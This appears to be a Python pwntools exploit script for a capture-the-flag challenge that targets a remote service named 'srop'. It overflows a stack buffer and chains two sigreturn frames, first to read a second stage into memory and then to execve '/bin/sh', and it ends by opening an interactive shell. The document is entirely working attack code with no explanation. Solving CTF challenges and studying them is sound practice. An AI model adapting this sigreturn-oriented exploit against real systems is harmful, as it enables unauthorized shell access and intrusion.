
from pwn import p64,remote,process

io = remote('srop.pwn.wanictf.org',9006)

mov_rax_f_ret = 0x40118d
syscall_ret = 0x40117e

bss_addr = 0x404040+0x800

payload = b'A'*72

payload += p64(mov_rax_f_ret)
payload += p64(syscall_ret)
payload += p64(0)*5
payload += p64(0)*8 #r8-r15
payload += p64(0) #rdi <- SYS_READ's 1st arg
payload += p64(bss_addr) #rsi <- SYS_READ's 2nd arg
payload += p64(bss_addr) #rbp
payload += p64(0) #rbc
payload += p64(306) #rdx
payload += p64(0) #rax SYS_READ
payload += p64(0) #rcx
payload += p64(bss_addr) #rsp
payload += p64(syscall_ret) #rip
payload += p64(0) #eflags
payload += p64(0x33) # csgsfs
payload += p64(0) * 4
payload += p64(0) # fpstate
print(len(payload))
payload += b'\x00' * (0x200-len(payload))


payload2 = p64(syscall_ret)
payload2 += p64(syscall_ret)
payload2 += p64(syscall_ret)
payload2 +=p64(0)*5
payload2 += p64(0)*8 #r8-r15
payload2 += p64(bss_addr + 8*34) #rdi <- SYS_EXECVE's 1st arg
payload2 += p64(0) #rsi <- SYS_EXECVE's 2nd arg
payload2 += p64(0) #rbp
payload2 += p64(0) #rbc
payload2 += p64(0) #rdx
payload2 += p64(0x3b) #rax SYS_READ
payload2 += p64(0) #rcx
payload2 += p64(bss_addr) #rsp
payload2 += p64(syscall_ret) #rip
payload2 += p64(0) #eflags
payload2 += p64(0x33) # csgsfs
payload2 += p64(0) * 4
payload2 += p64(0) # fpstate

payload2 += p64(bss_addr + 8*34)
payload2 += p64(0)
payload2 += b'/bin/sh\x00'
payload2 += b'A'*(306-len(payload2))

io.recv()
io.send(payload)
io.send(payload2)
io.send('A'*15)

import time
time.sleep(1e-3)

io.interactive()